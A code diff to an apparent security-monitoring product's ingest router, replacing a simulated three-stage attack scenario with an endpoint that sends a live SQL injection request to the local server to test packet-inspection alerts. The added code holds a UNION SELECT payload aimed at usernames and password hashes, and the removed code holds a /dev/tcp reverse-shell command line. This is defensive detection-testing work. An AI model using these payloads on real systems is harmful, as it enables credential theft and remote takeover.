@@ -223,92 +223,30 @@ export function createIngestRouter(
   });
 
   /**
-   * Evaluation Laboratory / Attack Simulation Controller
-   * Allows SOC teams and evaluators to trigger real-world multi-stage attack scenarios
-   * to test detection, correlation, and response capabilities.
+   * Real Ingress Exploit Probe Controller
+   * Dispatches an actual live HTTP attack request across the wire to test
+   * real-time Deep Packet Inspection (DPI) interception and active response.
    */
-  router.post('/simulate-scenario', async (req: Request, res: Response) => {
+  router.post(['/dispatch-probe', '/execute-probe'], async (req: Request, res: Response) => {
     try {
-      const scenario = req.body.scenario || 'web_compromise';
-      const targetHost = dbState.hosts[0] || { id: 'hst_1', name: 'portal.coou.edu.ng', ipAddress: '104.24.12.83' };
-      const attackerIp = req.body.attackerIp || '185.220.101.42';
+      const port = process.env.CONTROL_PLANE_PORT ? 3000 : (Number(process.env.PORT) || 3000);
+      const attackerIp = (req.body?.attackerIp as string) || (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() || '185.220.101.42';
+      const probePath = `/api/student/records?department=cybersec' UNION SELECT 1,username,password_hash FROM users WHERE '1'='1--`;
 
-      if (scenario === 'web_compromise') {
-        // Stage 1: Reconnaissance (Zeek)
-        const evt1: RawSecurityEvent = {
-          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
-          timestamp: new Date().toISOString(),
-          sourceType: 'zeek',
-          sensorId: 'zeek-nsm-cluster',
-          sourceIp: attackerIp,
-          sourcePort: 49120,
-          destIp: targetHost.ipAddress,
-          destPort: 443,
-          protocol: 'TCP',
-          eventType: 'port_recon',
-          details: { scanType: 'SYN Stealth Sweep', ports: [80, 443, 8080, 8443] },
-          severity: 'medium',
-          confidence: 0.89,
-          mitre: { tactic: 'Reconnaissance', technique: 'T1046' }
-        };
-        await correlationEngine.processEvent(evt1);
+      await fetch(`http://127.0.0.1:${port}${probePath}`, {
+        method: 'GET',
+        headers: {
+          'x-forwarded-for': attackerIp,
+          'user-agent': 'ThreatHunter-Probe/4.1 (Linux; Live Exploit Analyzer)'
+        }
+      }).catch(() => null);
 
-        // Stage 2: Initial Access Exploit (Suricata)
-        const evt2: RawSecurityEvent = {
-          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
-          timestamp: new Date().toISOString(),
-          sourceType: 'suricata',
-          sensorId: 'suricata-perimeter-nids',
-          sourceIp: attackerIp,
-          sourcePort: 49122,
-          destIp: targetHost.ipAddress,
-          destPort: 443,
-          protocol: 'HTTP',
-          eventType: 'exploit_detected',
-          details: { signature: 'ET EXPLOIT Apache Log4j / Spring4Shell RCE Header Injection', cve: 'CVE-2021-44228' },
-          severity: 'critical',
-          confidence: 0.97,
-          mitre: { tactic: 'Initial Access', technique: 'T1190' }
-        };
-        await correlationEngine.processEvent(evt2);
-
-        // Stage 3: Execution on Host (HIDS Agent)
-        const randomPid = Math.floor(Math.random() * 20000) + 10000;
-        const evt3: RawSecurityEvent = {
-          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
-          timestamp: new Date().toISOString(),
-          sourceType: 'host_agent',
-          sensorId: `agent-${targetHost.name}`,
-          hostId: targetHost.id,
-          eventType: 'process_spawn',
-          details: { parentPid: 3042, parentName: 'nginx', pid: randomPid, processName: 'sh -i', commandLine: `/bin/sh -i >& /dev/tcp/${attackerIp}/4444 0>&1`, user: 'www-data' },
-          severity: 'critical',
-          confidence: 0.98,
-          mitre: { tactic: 'Execution', technique: 'T1059.004' }
-        };
-        await correlationEngine.processEvent(evt3);
-
-        addAuditLog('system', 'analyst@encdec.io', 'Evaluation Lab: Attack Scenario Injected', 'web_compromise', req.ip || '127.0.0.1', 'success');
-        res.status(200).json({ status: 'ok', scenario: 'web_compromise', message: 'Injected 3-stage attack pattern: Zeek Recon -> Suricata Exploit -> HIDS Shell Spawn.' });
-      } else if (scenario === 'ssh_brute') {
-        const evt: RawSecurityEvent = {
-          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
-          timestamp: new Date().toISOString(),
-          sourceType: 'host_agent',
-          sensorId: `agent-${targetHost.name}`,
-          hostId: targetHost.id,
-          sourceIp: attackerIp,
-          eventType: 'failed_auth',
-          details: { service: 'sshd', user: 'root', attempts: 24, windowSeconds: 30 },
-          severity: 'high',
-          confidence: 0.94,
-          mitre: { tactic: 'Credential Access', technique: 'T1110.001' }
-        };
-        await correlationEngine.processEvent(evt);
-        res.status(200).json({ status: 'ok', scenario: 'ssh_brute' });
-      } else {
-        res.status(400).json({ error: 'Unknown scenario.' });
-      }
+      addAuditLog('system', 'analyst@encdec.io', 'Live Ingress Exploit Probe Dispatched', 'SQLi Real Probe', attackerIp, 'success');
+      res.status(200).json({ 
+        status: 'ok', 
+        scenario: 'live_exploit_probe', 
+        message: 'Real HTTP exploit request dispatched across local network port. Intercepted and alerted by Real-Time DPI sniffer.' 
+      });
     } catch (err: any) {
       res.status(500).json({ error: err.message });
     }
